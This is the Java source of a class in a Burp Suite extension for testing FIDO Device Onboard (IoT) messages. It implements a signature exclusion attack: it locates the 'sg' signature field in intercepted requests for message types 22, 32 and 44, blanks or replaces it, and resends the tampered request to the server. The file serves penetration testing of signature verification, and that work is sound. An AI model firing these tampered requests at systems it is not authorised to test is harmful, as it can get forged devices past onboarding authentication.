package src.main.eu.devity.burp.fidoiot.attacks;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import src.main.eu.devity.burp.fidoiot.utilities.Logger;
import burp.IHttpService;
import burp.IParameter;

import java.io.PrintWriter;

import java.net.URL;
import java.util.List;
import java.io.*;
import java.util.*;
import java.lang.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

import javax.swing.*;
import java.util.ArrayList;
import java.util.concurrent.ExecutionException;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.core.JsonProcessingException;
import java.io.IOException;


public class SignatureExcl {

    private static PrintWriter stdout;
    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IRequestInfo requestInfo;
    private IResponseInfo responseInfo;
    private IHttpService httpService;
    private int diff = 0;
    private boolean flag = false;
    private static final Logger loggerInstance = Logger.getInstance();

    private byte[] updateMessage;

    public SignatureExcl(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){

        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.requestResponse = message;
        this.requestInfo = helpers.analyzeRequest(message);
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.httpService = message.getHttpService();


    }


    public void signatureAttack(){


//        String request = new String(requestResponse.getRequest());
//        String messageBody = request.substrin
//        g(requestInfo.getBodyOffset());
//        byte[] updateMessage = helpers.buildHttpMessage(requestInfo.getHeaders(), messageBody.getBytes());
//        requestResponse.setRequest(updateMessage);

        List headers = requestInfo.getHeaders();
        headers.add("Test: BurpExHeader");
        String request = new String(requestResponse.getRequest());
        String messageBody = request.substring(requestInfo.getBodyOffset());
        stdout.println(requestInfo.getUrl());
        stdout.println(messageBody);
        for (IParameter param : requestInfo.getParameters()) {
            // parameter with empty signature
            if (param.getName().matches("sg")) {
                requestResponse.setHighlight("red");
                flag = true;
            }
        }

        if(flag) {
            Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
            List<Integer> pos = new ArrayList<Integer>();
            while (m.find()) {
                pos.add(m.start());
            }

            for(int n:pos) {
                messageBody = modifyString(messageBody, (n-diff));
            }
            stdout.println("Performing Signature exclusion attack");
            stdout.println(messageBody);
            stdout.println(requestInfo.getUrl());
//            byte[] updateMessage = helpers.buildHttpMessage(requestInfo.getHeaders(), messageBody.getBytes());
//            requestResponse.setRequest(updateMessage);
//
//            IHttpService httpService = requestResponse.getHttpService();
//            callbacks.makeHttpRequest(httpService, requestResponse.getRequest());
//
//            stdout.println(requestResponse.getResponse());
        }
    }

    public String modifyString(String msgStr, int indexStart){
        String values = "0,0";
        String tempStr = msgStr.substring(0,indexStart+5);
        String truncatedStr = msgStr.substring(indexStart+6);
        int y = truncatedStr.indexOf("]");
        String remainStr = truncatedStr.substring(y);
        tempStr = tempStr.concat(values).concat(remainStr);
        diff = msgStr.length() - tempStr.length();
        return tempStr;
    }

    public void autoAttackSigExcl(){
        loggerInstance.log(getClass(), "Executing AutoMated Signature Exclusion Attack"  , Logger.LogLevel.INFO);
        List headers = requestInfo.getHeaders();
        String request = new String(requestResponse.getRequest());
        String messageBody = request.substring(requestInfo.getBodyOffset());

        stdout.println(messageBody);
        Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
        List<Integer> pos = new ArrayList<Integer>();
        while (m.find()) {
            pos.add(m.start());
        }

        for(int n:pos) {
            messageBody = modifyString(messageBody, (n-diff));
        }
        updateMessage = helpers.buildHttpMessage(headers, messageBody.getBytes());
        // WIP to add proxy
       // this.sendAttackReq();
    }

    /**
     * User edited message converted into request
     * @param modText
     * @return
     */

    public byte[] generateRequest(String modText, boolean isProxy, String proxyDNS, int proxyPort){
        //List headers = requestInfo.getHeaders();
        List<String> headers = requestInfo.getHeaders();
        String request = new String(requestResponse.getRequest());
        String messageBody = request.substring(requestInfo.getBodyOffset());
        if(isProxy){
            this.httpService = helpers.buildHttpService(proxyDNS,proxyPort,this.httpService.getProtocol());
        }
        updateMessage = helpers.buildHttpMessage(headers, modText.getBytes());
        return updateMessage;
    }


    public void sendAttackReq(){
        loggerInstance.log(getClass(), "Executing Signature Exclusion Attack"  , Logger.LogLevel.INFO);
        AttackExecutor attackRequestExecutor = new AttackExecutor(updateMessage);
        attackRequestExecutor.execute();
    }

    /**
     * Auto attack for sign exclusion
     */
    public void autoAttack(String bodyTxt, String inputVal, boolean proxyVal, String proxyDNS, int proxyPort) {
        List<String> headers = requestInfo.getHeaders();
        Integer msgType = 0;
        for(String header : headers){
            if(header.contains("msg/22")){
                msgType = 22;
                break;
            }
            if(header.contains("msg/32")){
                msgType = 32;
                break;
            }
            if(header.contains("msg/44")){
                msgType = 44;
                break;
            }
         }
         int temp; 
         String closingTag, newStr;
         if(msgType == 22){
            int tempbod =  bodyTxt.indexOf("\"sg\""); // there are two bo
            temp =  bodyTxt.indexOf("\"sg\"", tempbod+1);
            closingTag = "]}}";
         } else {
            temp =  bodyTxt.indexOf("\"sg\"");
            closingTag = "]}";
         }
         String remainStr = bodyTxt.substring(temp+6);
         if (inputVal.length() == 0){
            newStr = bodyTxt.substring(0,temp+6) + "0,0" + closingTag;
         } else {
            newStr = bodyTxt.substring(0,temp+6) + inputVal.length() + "," + "\""+ inputVal +"\"" + closingTag;
         }
         if(proxyVal){
            this.httpService = helpers.buildHttpService(proxyDNS,proxyPort,this.httpService.getProtocol());
        }
        updateMessage = helpers.buildHttpMessage(headers, newStr.getBytes());
        this.sendAttackReq();
    }


    /**
     * Java Swing worker to execute attack in the background
     */


    private class AttackExecutor extends SwingWorker<IHttpRequestResponse, Integer> {
        private byte[] attackRequest;

        AttackExecutor(byte[] attackRequest) {
            this.attackRequest = attackRequest;
        }

        @Override
        // Fire prepared request and return responses as IHttpRequestResponse
        protected IHttpRequestResponse doInBackground() {
            return callbacks.makeHttpRequest(httpService, attackRequest);
        }

        @Override
        // Add response to response list, add new entry to attacker result
        // window table and update process bar
        protected void done() {
            IHttpRequestResponse requestResponse;
            try {
                requestResponse = get();
            } catch (InterruptedException | ExecutionException e) {
                loggerInstance.log(SignatureExcl.class, "Failed to get request result: " + e.getMessage(), Logger.LogLevel.ERROR);
                return;
            }
            // getting message from the response
            String temp = new String(requestResponse.getResponse());
            responseInfo = helpers.analyzeResponse(requestResponse.getResponse());
            String messageBody = temp.substring(responseInfo.getBodyOffset());
            loggerInstance.log(getClass(), "Attack Performed: " +messageBody , Logger.LogLevel.DEBUG);
        }
    }




}